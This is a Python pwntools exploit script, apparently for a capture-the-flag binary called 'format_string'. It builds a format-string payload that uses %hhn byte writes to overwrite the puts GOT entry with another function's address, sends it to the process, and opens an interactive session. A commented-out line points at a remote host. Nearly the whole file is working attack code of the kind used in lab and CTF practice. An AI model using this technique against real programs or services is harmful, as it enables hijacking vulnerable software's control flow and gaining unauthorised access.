#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack


# count = 0
# conn = remote("4.31.182.242", 9002) 
conn = process('./format_string')

# raw_input('Continue?')


# Welcome message
# front_line = conn.recvuntil("\n")

welcome = conn.recvuntil('>')
welcome += conn.recvuntil('>')
welcome += conn.recvuntil('>')
print welcome

# index = welcome.index("0x")
# addr_str = welcome[index: index + 10]
# addr = int(addr_str, 16)

# log.info('Function at:' + str(hex(addr)))
# log.info('Eip is at:' + "0xbffff34c") 
# log.info('Eip is:' + "0x8048512") 

data = 0x0804851f

# 0xaabbccdd -> aabbccdd
hexStr = hex(data)[2:][::-1] # little endian

# aabbccdd -> [aa, bb, cc, dd]
byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

bytes = [int(x,16) for x in byteList]

write_addr = 0x08049aec # puts


# def payload_write_data_to_addr(data, addr):

payload = "A" 
for a in range(len(bytes)):
	payload += p32(write_addr + a)
# payload += p32(write_addr) 
# payload += p32(write_addr + 1)
# payload += p32(write_addr + 2)
# payload += p32(write_addr + 3)


# this is the offset of the first address in our string
offset = 7 

# current_val is the current number of bytes writen
# the 4 addresses + the A
current_val = 4*4 + 1 

# we have our 4 addresses to each byte of the eip
# write to one of those current_val
write_to_byte = lambda a: "%{0}$hhn".format(a + offset)

def set_cur_val(a):
	global current_val
	gets_to_zero = 256 - current_val # add this to get to 0x00
	gets_to_destination = gets_to_zero + a # add this to get to where you want to be
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256
	current_val = a
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 
	return "%5$0" + str(inc) + "c" 


# func at  0x080484db
# 0x0804851f

for pos, byte in enumerate(bytes):
	print hex(byte)
	payload += set_cur_val(byte) + write_to_byte(pos)
# payload += set_cur_val(0x1f) + write_to_byte(0)
# payload += set_cur_val(0x85) + write_to_byte(1)
# payload += set_cur_val(0x04) + write_to_byte(2)
# payload += set_cur_val(0x08) + write_to_byte(3)
# return payload

# payload += ">%35$x<" 
# start = 30
# for x in range(start, start + 100):
# 	payload += "%" + str(x) + "$x."
with open('payload', 'w') as f:
	f.write(payload)

log.info('Sending payload:' + payload)
conn.sendline(payload)
# print conn.recvuntil("\n")

print conn.recv()
print conn.recv()
conn.sendline("HelloA")
print conn.recv()
conn.sendline("HelloB")
print conn.recv()

conn.interactive()

conn.recv()
print conn.recv()
conn.close()



